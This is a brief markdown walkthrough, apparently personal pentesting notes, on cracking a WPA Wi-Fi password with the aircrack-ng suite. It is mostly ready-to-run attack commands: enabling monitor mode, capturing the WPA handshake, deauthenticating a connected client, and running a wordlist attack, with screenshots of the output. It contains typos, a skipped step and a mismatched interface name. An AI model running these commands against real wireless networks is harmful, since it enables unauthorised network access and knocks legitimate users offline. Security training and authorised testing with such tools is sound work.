# Airkrack-ng
## What needed?

1. MAC Address of the Attacker
2. BSSID 
3. ESSID
4. Channel
5. Interface
6. Root acccess

## What to do?

### Get information about the Target

1. Get SSID from the Traget.
 > netdicover
 
 Search for IP Address common for Access Points/ Routers
 Mac AP: 00:11:6b:2d:9f:b7
 
2. Use airmon-ng to check for wifi interfaces

![image](https://user-images.githubusercontent.com/63262820/169005453-2e40bcd5-5bb8-4e8d-a191-6609c73f74ac.png)

3. Stop any useless interfaces with the command:
> airmon-ng stop "interface"

4. Start interface wlan0 in monitor mode and with de realated wlan channel:
>  airmon-ng start wlan0 9

![image](https://user-images.githubusercontent.com/63262820/169005722-cf7c77fd-35a8-41af-918f-7f8a86376acf.png)

5. Now the interface wlan0 is called wlan0mon


7. To confirm the interface is properly setup, enter:
> iwconfig

![image](https://user-images.githubusercontent.com/63262820/169006405-f3db4138-3622-4365-93b4-9324c1331d76.png)

8. Now capture the WPA Handshake.
> airodump-ng -c 9 --sbssid "AP MAC" -w psk wlan0mon

Wait until you see the message WPA Handshake

![image](https://user-images.githubusercontent.com/63262820/169010546-630a156f-b42b-4ab5-b78a-b6d20835a7ba.png)

9. Use aireplay-ng to deauthenticate the wireless client

aireplay-ng -0 1 -a "MAC AP" -c "MAC Client" ath0

![image](https://user-images.githubusercontent.com/63262820/169011963-b2ceb0fa-b1df-4601-8f64-62816362ed49.png)

10. Search for the latest psk file.
![image](https://user-images.githubusercontent.com/63262820/169012173-4777eae1-96dd-459f-add8-526d58b5bf66.png)

11. Run

> aircrack-ng -w password.lst -b "BSSID" psk*.cap

If successfull:

![image](https://user-images.githubusercontent.com/63262820/169012812-9d9353f7-2dd6-46ec-ae03-840bc93f475c.png)
